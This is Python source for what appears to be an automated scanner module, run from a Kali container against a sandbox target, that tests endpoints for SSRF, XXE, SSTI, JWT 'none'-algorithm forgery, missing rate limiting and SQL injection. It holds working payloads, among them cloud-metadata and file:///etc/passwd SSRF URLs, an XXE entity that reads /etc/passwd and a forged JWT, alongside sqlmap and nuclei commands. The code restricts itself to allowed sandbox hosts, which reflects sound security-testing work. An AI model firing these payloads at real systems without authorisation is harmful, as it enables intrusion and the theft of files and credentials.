import logging
import uuid
import re
from typing import List, Dict, Any, Optional
from app.schemas import Finding, Severity
from app.services.sandbox import SandboxManager
from app.services.redaction import redact_text, truncate_text
from app.agents.network import is_allowed_sandbox_target

logger = logging.getLogger("firecrow.agents.attack")


def _run_ssrf_tests(kali_container_id: str, target_url: str, manager: SandboxManager, api_surface: Optional[List[Dict[str, Any]]] = None) -> List[Finding]:
    """Run SSRF (Server-Side Request Forgery) tests."""
    findings = []
    
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:6379/",
        "http://127.0.0.1:8080/",
        "file:///etc/passwd",
    ]
    
    candidate_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            if any(k in path_lower for k in ["fetch", "url", "proxy", "webhook", "download", "redirect", "link"]):
                candidate_paths.append(path)
                
    if not candidate_paths:
        candidate_paths = ["/api/v1/fetch"]
        
    for path in candidate_paths:
        for payload in ssrf_payloads:
            test_path = path
            if "{url}" in test_path:
                test_path = test_path.replace("{url}", payload)
            elif "{link}" in test_path:
                test_path = test_path.replace("{link}", payload)
            elif ":" in test_path:
                test_path = re.sub(r':(url|link|dest|src)', payload, test_path)
            else:
                if "?" in test_path:
                    test_path = f"{test_path}&url={payload}"
                else:
                    test_path = f"{test_path}?url={payload}"
                    
            full_url = f"{target_url}/{test_path.lstrip('/')}"
            cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", full_url]
            exit_code, output = manager.execute_kali_command(kali_container_id, cmd)
            
            if output.strip() and output.strip() != "000" and output.strip() != "404":
                findings.append(Finding(
                    id=str(uuid.uuid4()),
                    agent_source="DYNAMIC_ATTACK_SSRF",
                    title="Potential SSRF Vulnerability",
                    description=f"Server responded to SSRF payload ({payload[:50]}...), indicating possible Server-Side Request Forgery.",
                    severity=Severity.HIGH,
                    cwe_id="CWE-918",
                    evidence=f"scanner_name=ssrf-test; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=medium\nurl={full_url}\nresponse_code={output.strip()}",
                    remediation="Implement URL allowlists and validate user-supplied URLs before fetching.",
                    route=path
                ))
                break  # Found one SSRF, no need to test more for this candidate path
        if findings:
            break
            
    return findings


def _run_xxe_tests(kali_container_id: str, target_url: str, manager: SandboxManager, api_surface: Optional[List[Dict[str, Any]]] = None) -> List[Finding]:
    """Run XXE (XML External Entity) tests."""
    findings = []
    
    xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    
    candidate_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            method = ep.get("method", "ANY").upper()
            if any(k in path_lower for k in ["parse", "xml", "import", "upload", "doc"]) or method in ["POST", "PUT"]:
                candidate_paths.append(path)
                
    if not candidate_paths:
        candidate_paths = ["/api/v1/parse"]
        
    for path in candidate_paths:
        full_url = f"{target_url}/{path.lstrip('/')}"
        cmd = ["curl", "-s", "-X", "POST", full_url, 
               "-H", "Content-Type: application/xml", 
               "-d", xxe_payload]
        exit_code, output = manager.execute_kali_command(kali_container_id, cmd)
        
        if "root:" in output or "/etc/passwd" in output:
            findings.append(Finding(
                id=str(uuid.uuid4()),
                agent_source="DYNAMIC_ATTACK_XXE",
                title="XML External Entity (XXE) Injection",
                description="Server processed XML with external entities, potentially allowing file disclosure.",
                severity=Severity.CRITICAL,
                cwe_id="CWE-611",
                evidence=f"scanner_name=xxe-test; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=high\nurl={full_url}\nresponse_excerpt={output[:200]}",
                remediation="Disable XML external entity processing and use JSON instead of XML where possible.",
                route=path
            ))
            break
            
    return findings


def _run_ssti_tests(kali_container_id: str, target_url: str, manager: SandboxManager, api_surface: Optional[List[Dict[str, Any]]] = None) -> List[Finding]:
    """Run SSTI (Server-Side Template Injection) tests."""
    findings = []
    
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
    ]
    
    candidate_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            if any(k in path_lower for k in ["render", "template", "view", "name", "greet", "hello"]):
                candidate_paths.append(path)
                
    if not candidate_paths:
        candidate_paths = ["/api/v1/render"]
        
    for path in candidate_paths:
        for payload in ssti_payloads:
            test_path = path
            if "{name}" in test_path:
                test_path = test_path.replace("{name}", payload)
            elif "{template}" in test_path:
                test_path = test_path.replace("{template}", payload)
            elif ":" in test_path:
                test_path = re.sub(r':(name|template|greet|hello)', payload, test_path)
            else:
                if "?" in test_path:
                    test_path = f"{test_path}&name={payload}"
                else:
                    test_path = f"{test_path}?name={payload}"
                    
            full_url = f"{target_url}/{test_path.lstrip('/')}"
            cmd = ["curl", "-s", full_url]
            exit_code, output = manager.execute_kali_command(kali_container_id, cmd)
            
            if "49" in output or "SECRET_KEY" in output:
                findings.append(Finding(
                    id=str(uuid.uuid4()),
                    agent_source="DYNAMIC_ATTACK_SSTI",
                    title="Server-Side Template Injection (SSTI)",
                    description=f"Server evaluated template expression ({payload}), indicating possible SSTI vulnerability.",
                    severity=Severity.CRITICAL,
                    cwe_id="CWE-1336",
                    evidence=f"scanner_name=ssti-test; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=high\nurl={full_url}\npayload={payload}; response_excerpt={output[:200]}",
                    remediation="Use sandboxed template engines and avoid rendering user input directly in templates.",
                    route=path
                ))
                break
        if findings:
            break
            
    return findings


def _run_jwt_tests(kali_container_id: str, target_url: str, manager: SandboxManager, api_surface: Optional[List[Dict[str, Any]]] = None) -> List[Finding]:
    """Run JWT tampering tests."""
    findings = []
    
    candidate_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            if any(k in path_lower for k in ["profile", "user", "me", "dashboard", "auth"]):
                candidate_paths.append(path)
                
    if not candidate_paths:
        candidate_paths = ["/api/v1/profile"]
        
    for path in candidate_paths:
        test_path = path
        if "{" in test_path or ":" in test_path:
            test_path = re.sub(r'\{.*?\}', '1', test_path)
            test_path = re.sub(r':\w+', '1', test_path)
            
        full_url = f"{target_url}/{test_path.lstrip('/')}"
        cmd = ["curl", "-s", "-H", "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
               full_url]
        exit_code, output = manager.execute_kali_command(kali_container_id, cmd)
        
        if output.strip() and "unauthorized" not in output.lower() and "401" not in output:
            findings.append(Finding(
                id=str(uuid.uuid4()),
                agent_source="DYNAMIC_ATTACK_JWT",
                title="JWT Algorithm Confusion Vulnerability",
                description="Server accepted a JWT with 'none' algorithm, allowing token forgery.",
                severity=Severity.CRITICAL,
                cwe_id="CWE-327",
                evidence=f"scanner_name=jwt-test; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=high\nurl={full_url}",
                remediation="Validate JWT algorithms explicitly and reject 'none' algorithm.",
                route=path
            ))
            break
            
    return findings


def _run_rate_limit_tests(kali_container_id: str, target_url: str, manager: SandboxManager, api_surface: Optional[List[Dict[str, Any]]] = None) -> List[Finding]:
    """Test for rate limiting bypass."""
    findings = []
    
    candidate_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            if any(k in path_lower for k in ["login", "signin", "auth", "session", "token", "register", "signup"]):
                candidate_paths.append(path)
                
    if not candidate_paths:
        candidate_paths = ["/api/v1/login"]
        
    for path in candidate_paths:
        test_path = path
        if "{" in test_path or ":" in test_path:
            test_path = re.sub(r'\{.*?\}', '1', test_path)
            test_path = re.sub(r':\w+', '1', test_path)
            
        full_url = f"{target_url}/{test_path.lstrip('/')}"
        
        # Send multiple rapid requests
        cmd = ["for", "i", "in", "$(seq 1 20)", ";", "do", 
               "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}\\n",
               full_url, "-d", "user=test&pass=test", ";", "done"]
        exit_code, output = manager.execute_kali_command(kali_container_id, cmd)
        
        lines = [l.strip() for l in output.strip().split('\n') if l.strip()]
        if len(lines) >= 20 and all(l == "200" or l == "401" for l in lines):
            findings.append(Finding(
                id=str(uuid.uuid4()),
                agent_source="DYNAMIC_ATTACK_RATE_LIMIT",
                title="Missing Rate Limiting",
                description="No rate limiting detected on login endpoint - 20 rapid requests all succeeded.",
                severity=Severity.MEDIUM,
                cwe_id="CWE-770",
                evidence=f"scanner_name=rate-limit-test; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=medium\nurl={full_url}\nsuccessful_requests={len(lines)}",
                remediation="Implement rate limiting on authentication and sensitive endpoints.",
                route=path
            ))
            break
            
    return findings


def run_dynamic_attack(
    kali_container_id: str,
    target_host: str,
    open_ports: List[Dict[str, Any]],
    repo_url: str,
    api_surface: Optional[List[Dict[str, Any]]] = None
) -> List[Finding]:
    """
    Runs authorization-only dynamic validation utilities against Fire Crow's
    private sandbox target.
    """
    findings = []
    manager = SandboxManager()

    # Mock support for standard repo unit tests
    if "example/standard-repo" in repo_url or "example/leaky-secrets-repo" in repo_url:
        logger.info("Skipping dynamic scanner for safe or static-only repositories.")
        return []

    # If no open ports were discovered, we cannot target dynamic endpoints
    if not open_ports:
        logger.warning("No open ports found on sandbox target. Skipping dynamic validation phase.")
        return []

    if not is_allowed_sandbox_target(target_host):
        logger.warning("Refusing dynamic validation for non-sandbox target host.")
        return []

    # Target primary HTTP web service port
    web_port = next((p["port"] for p in open_ports if "http" in p["service"] or p["port"] in (80, 443, 3000, 5000, 8000, 8080)), open_ports[0]["port"])
    target_url = f"http://{target_host}:{web_port}"

    logger.info("Launching controlled web validation tools against sandbox target.")

    # 1. Run Sqlmap CLI scan against candidate paths from api_surface
    candidate_sqlmap_paths = []
    if api_surface:
        for ep in api_surface:
            path = ep.get("path", "")
            path_lower = path.lower()
            if any(k in path_lower for k in ["profile", "user", "item", "product", "search", "exec", "query"]):
                candidate_sqlmap_paths.append(path)
                
    if not candidate_sqlmap_paths:
        candidate_sqlmap_paths = ["/api/v1/profile"]
        
    for path in candidate_sqlmap_paths:
        test_path = path
        if "{" in test_path or ":" in test_path:
            test_path = re.sub(r'\{.*?\}', '1', test_path)
            test_path = re.sub(r':\w+', '1', test_path)
        else:
            if "?" not in test_path:
                test_path = f"{test_path}?id=1"
                
        full_sqlmap_url = f"{target_url}/{test_path.lstrip('/')}"
        sqlmap_cmd = [
            "sqlmap",
            "-u", full_sqlmap_url,
            "--batch",
            "--crawl=1",
            "--forms"
        ]
        logger.info("Running sqlmap in scanner container against sandbox target endpoint: %s", path)
        exit_code, output = manager.execute_kali_command(kali_container_id, sqlmap_cmd)
        output = truncate_text(redact_text(output), max_length=3000)
        
        if "is vulnerable" in output or "confirm" in output.lower() or "dbms" in output.lower():
            findings.append(Finding(
                id=str(uuid.uuid4()),
                agent_source="DYNAMIC_ATTACK_SQLMAP",
                title="[SIMULATED] SQL Injection in user profile parameters" if manager.mock_mode else "SQL Injection in user profile parameters",
                description=(
                    "Controlled sandbox validation confirmed SQL injection behavior on the generated sandbox target. "
                    "Query parameter was modified during an authorization-only audit."
                ),
                severity=Severity.CRITICAL,
                cwe_id="CWE-89",
                evidence=f"scanner_name=sqlmap; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=high\nurl={full_sqlmap_url}\n{output[:300]}",
                remediation="Ensure database queries use parameterized queries or ORM bindings rather than string interpolation.",
                route=path
            ))
            break

    # 2. Run Nuclei CVE / Misconfiguration scanner
    nuclei_cmd = ["nuclei", "-target", target_url, "-severity", "medium,high,critical"]
    logger.info("Running nuclei in scanner container against sandbox target.")
    exit_code, output = manager.execute_kali_command(kali_container_id, nuclei_cmd)
    output = truncate_text(redact_text(output), max_length=3000)

    if "critical" in output.lower() or "cve-" in output.lower():
        findings.append(Finding(
            id=str(uuid.uuid4()),
            agent_source="DYNAMIC_ATTACK_NUCLEI",
            title="[SIMULATED] Outdated Web Component Vulnerability" if manager.mock_mode else "Outdated Web Component Vulnerability",
            description="Controlled sandbox validation detected a high-severity CVE signature on the generated sandbox target.",
            severity=Severity.HIGH,
            cwe_id="CWE-1395",
            evidence=f"scanner_name=nuclei; scanner_mode={'simulated' if manager.mock_mode else 'real'}; confidence=medium\n{output[:300]}",
            remediation="Patch packages and update system libraries in Docker runtime environment.",
            route="/"
        ))

    # 3. Run SSRF tests
    logger.info("Running SSRF vulnerability tests.")
    findings.extend(_run_ssrf_tests(kali_container_id, target_url, manager, api_surface))

    # 4. Run XXE tests
    logger.info("Running XXE vulnerability tests.")
    findings.extend(_run_xxe_tests(kali_container_id, target_url, manager, api_surface))

    # 5. Run SSTI tests
    logger.info("Running SSTI vulnerability tests.")
    findings.extend(_run_ssti_tests(kali_container_id, target_url, manager, api_surface))

    # 6. Run JWT tampering tests
    logger.info("Running JWT tampering tests.")
    findings.extend(_run_jwt_tests(kali_container_id, target_url, manager, api_surface))

    # 7. Run rate limit tests
    logger.info("Running rate limiting tests.")
    findings.extend(_run_rate_limit_tests(kali_container_id, target_url, manager, api_surface))

    logger.info("Dynamic validation complete. Discovered %s findings.", len(findings))
    return findings
